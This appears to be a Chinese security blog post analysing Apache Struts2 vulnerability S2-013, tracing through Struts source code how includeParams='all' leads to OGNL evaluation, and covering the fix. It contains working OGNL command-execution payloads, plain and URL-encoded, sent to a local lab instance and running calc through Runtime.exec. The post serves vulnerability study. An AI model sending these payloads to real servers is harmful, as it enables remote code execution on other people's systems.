---
title: 【Struts2-命令-代码执行漏洞分析系列】 S2-013
date: 2018-09-02 19:29:50
tags:
	- java
	- struts2
	- 漏洞分析
---

# 前言

S2-014是对于S2-013修复不完整的造成的漏洞，会在**漏洞分析**中提到，所以文本的主要分析的还是S2-013

而且在分析的时候，发现参考网上资料时对于漏洞触发逻辑的一些错误  至少目前我自己是那么认为的：） 

漏洞环境根据vulhub修改而来，环境地址 https://github.com/kingkaki/Struts2-Vulenv，感兴趣的师傅可以一起分析下



若有疏漏，还望多多指教



# 漏洞信息

https://cwiki.apache.org/confluence/display/WW/S2-013

![](Struts2-命令-代码执行漏洞分析系列-S2-013\1.png)



> Both the *s:url* and *s:a* tag provide an *includeParams* attribute.
>
> The main scope of that attribute is to understand whether includes http request parameter or not.
>
> The allowed values of includeParams are:
>
> 1. *none* - include no parameters in the URL (default)
> 2. *get* - include only GET parameters in the URL
> 3. *all* - include both GET and POST parameters in the URL
>
> A request that included a specially crafted request parameter could be used to inject arbitrary OGNL code into the stack, afterward used as request parameter of an *URL* or *A* tag , which will cause a further evaluation.
>
> The second evaluation happens when the URL/A tag tries to resolve every parameters present in the original request.
> This lets malicious users put arbitrary OGNL statements into any request parameter (not necessarily managed by the code) and have it evaluated as an OGNL expression to enable method execution and execute arbitrary methods, bypassing Struts and OGNL library protections.

struts2的标签中 `<s:a>` 和 `<s:url>` 都有一个 includeParams 属性，可以设置成如下值

1. *none* - URL中*不*包含任何参数（默认）
2. *get* - 仅包含URL中的GET参数
3. *all* - 在URL中包含GET和POST参数

当`includeParams=all`的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。

此时`<s:a>` 或`<s:url>`尝试去解析原始请求参数时，会导致OGNL表达式的执行



# 漏洞利用

不妨先来看下index.jsp中标签是怎么设置的

```java
<p><s:a id="link1" action="link" includeParams="all">"s:a" tag</s:a></p>
<p><s:url id="link2" action="link" includeParams="all">"s:url" tag</s:url></p>
```

然后来测试一下最简单payload `${1+1}`（记得编码提交 ：）

```
http://localhost:8888/link.action?a=%24%7B1%2b1%7D
```

就可以看到返回的url中的参数已经被解析成了2

![](Struts2-命令-代码执行漏洞分析系列-S2-013\2.png)



然后命令执行的payload

```
${#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('calc').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(+new java.lang.String(#d)),#out.close()}
```

编码后提交

```
http://localhost:8888/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27calc%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read%28%23d%29%2C%23out%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23out.println%28%2bnew%20java.lang.String%28%23d%29%29%2C%23out.close%28%29%7D
```

![](Struts2-命令-代码执行漏洞分析系列-S2-013\3.png)



# 漏洞分析

网上关于S2-013的分析将它的形成归结于

>  org.apache.struts2.views.uti.DefaultUrlHelper这个class的parseQueryString方法
>
> 在`String translatedParamValue = translateAndDecode(paramValue);`的时候解析了ONGL从而造成的代码执行

这里我先说明两点 

 - 我分析时的漏洞环境种`xwork-core`的版本是2.2.3，`DefaultUrlHelper.class`中的类全部在`UrlHelper.class`，但是代码逻辑并没有更改
 - 至于漏洞究竟是哪里触发的，可以根据弹出计算器在哪弹出来确定究竟是哪里触发的



我们可以从一开始的`struts2-core-2.2.3.jar!/org/apache/struts2/components/Anchor.class:64`中这两句开始关注

```java
this.urlRenderer.beforeRenderUrl(this.urlProvider);
this.urlRenderer.renderUrl(sw, this.urlProvider);
```

第一句是返回url之前的一些处理，第二句是返回url，从第一句开始打下断点，然后跟进去

果然还是来到了`struts2-core-2.2.3.jar!/org/apache/struts2/views/util/UrlHelper.class:240`的`parseQueryString`方法

但是可以看到，即使过了网上说的这个触发点，计算器依旧没有弹出

```
String translatedParamValue = translateAndDecode(paramValue);
```

![](Struts2-命令-代码执行漏洞分析系列-S2-013\4.png)

仅仅是做了一个url编码的过程，然后就返回了，那就继续跟下去吧

最后做完了url的一些预先处理，又回到了之前下断点的下一句

![](Struts2-命令-代码执行漏洞分析系列-S2-013\5.png)

step into进去之后来到了`struts2-core-2.2.3.jar!/org/apache/struts2/components/ServletUrlRenderer.class:39`

```java
public void renderUrl(Writer writer, UrlProvider urlComponent) {
    String scheme = urlComponent.getHttpServletRequest().getScheme();
    if (urlComponent.getScheme() != null) {
        scheme = urlComponent.getScheme();
    }

    ActionInvocation ai = (ActionInvocation)ActionContext.getContext().get("com.opensymphony.xwork2.ActionContext.actionInvocation");
    String result;
    String _value;
    String var;
    if (urlComponent.getValue() == null && urlComponent.getAction() != null) {
        result = urlComponent.determineActionURL(urlComponent.getAction(), urlComponent.getNamespace(), urlComponent.getMethod(), urlComponent.getHttpServletRequest(), urlComponent.getHttpServletResponse(), urlComponent.getParameters(), scheme, urlComponent.isIncludeContext(), urlComponent.isEncode(), urlComponent.isForceAddSchemeHostAndPort(), urlComponent.isEscapeAmp());
    } else  ...
```

真正触发漏洞在这一个语句里面，不妨跟进去看一下

![](Struts2-命令-代码执行漏洞分析系列-S2-013\6.png)

来到了`struts2-core-2.2.3.jar!/org/apache/struts2/components/Component.class:198`

![](Struts2-命令-代码执行漏洞分析系列-S2-013\7.png)

继续跟进最后一行的那个函数

来到了`struts2-core-2.2.3.jar!/org/apache/struts2/views/util/UrlHelper.class:49`的`buildUrl`函数中

![](Struts2-命令-代码执行漏洞分析系列-S2-013\8.png)

前面做了一些url的处理，添加一些`http(s)://`之类的前缀，来到后面之后，116行有这样一句

```java
if (escapeAmp) {
    buildParametersString(params, link);
} 
```

这里才是真正的开始build参数

继续step into之后`struts2-core-2.2.3.jar!/org/apache/struts2/views/util/UrlHelper.class:139`

```java
public static void buildParametersString(Map params, StringBuilder link, String paramSeparator) {
        if (params != null && params.size() > 0) {
            if (link.toString().indexOf("?") == -1) {
                link.append("?");
            } else {
                link.append(paramSeparator);
            }

            Iterator iter = params.entrySet().iterator();

            while(iter.hasNext()) {
                Entry entry = (Entry)iter.next();
                String name = (String)entry.getKey();
                Object value = entry.getValue();
                if (value instanceof Iterable) {
                    Iterator iterator = ((Iterable)value).iterator();

                    while(iterator.hasNext()) {
                        Object paramValue = iterator.next();
                        link.append(buildParameterSubstring(name, paramValue.toString()));
                        if (iterator.hasNext()) {
                            link.append(paramSeparator);
                        }
                    }
                } else if (value instanceof Object[]) {
                    Object[] array = (Object[])((Object[])value);

                    for(int i = 0; i < array.length; ++i) {
                        Object paramValue = array[i];
                        link.append(buildParameterSubstring(name, paramValue.toString()));
                        .....
```

取出参数值之后放入了一个数组中，再经过了`buildParameterSubstring`方法

![](Struts2-命令-代码执行漏洞分析系列-S2-013\9.png)

`buildParameterSubstring`方法就在这段代码后面

```java
private static String buildParameterSubstring(String name, String value) {
    StringBuilder builder = new StringBuilder();
    builder.append(translateAndEncode(name));
    builder.append('=');
    builder.append(translateAndEncode(value));
    return builder.toString();
}
```

也就是这里，这时url解码之后的**`translateAndEncode(value)`**才真正的造成了代码的执行，才弹出了计算器

![](Struts2-命令-代码执行漏洞分析系列-S2-013\10.png)

补一段`translateAndEncode`和`translateVariable`的代码，其实就刚才逻辑分析的下面

```java
    public static String translateAndDecode(String input) {
        String translatedInput = translateVariable(input);
        String encoding = getEncodingFromConfiguration();

        try {
            return URLDecoder.decode(translatedInput, encoding);
        } catch (UnsupportedEncodingException var4) {
            LOG.warn("Could not encode URL parameter '" + input + "', returning value un-encoded", new String[0]);
            return translatedInput;
        }
    }

    private static String translateVariable(String input) {
        ValueStack valueStack = ServletActionContext.getContext().getValueStack();
        String output = TextParseUtil.translateVariables(input, valueStack);
        return output;
    }
```



# 漏洞修复

在S2-013中用于验证的poc为

```
%{(#_memberAccess['allowStaticMethodAccess']=true)(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println('hacked'),#writer.close())}
```

于是官方就限制了`%{(#exp)}`格式的OGNL执行，从而造成了S2-014

因为还有`%{exp}`形式的漏洞，让我们一起看下最终的修补方案

重点自然是放在了`DefauiltUrlHlper.class`中

将之前的`translateAndEncode`更改成了`encode`

```java
    public String encode(String input) {
        try {
            return URLEncoder.encode(input, this.encoding);
        } catch (UnsupportedEncodingException var3) {
            if (LOG.isWarnEnabled()) {
                LOG.warn("Could not encode URL parameter '#0', returning value un-encoded", new String[]{input});
            }

            return input;
        }
    }
```

只支持简单的url解码

![](Struts2-命令-代码执行漏洞分析系列-S2-013\11.png)

之前触发的点也将函数换成了decode

![](Struts2-命令-代码执行漏洞分析系列-S2-013\12.png)

![](Struts2-命令-代码执行漏洞分析系列-S2-013\13.png)

  

# Reference Links

https://github.com/vulhub/vulhub/tree/master/struts2/s2-013

https://cwiki.apache.org/confluence/display/WW/S2-013

https://cwiki.apache.org/confluence/display/WW/S2-014

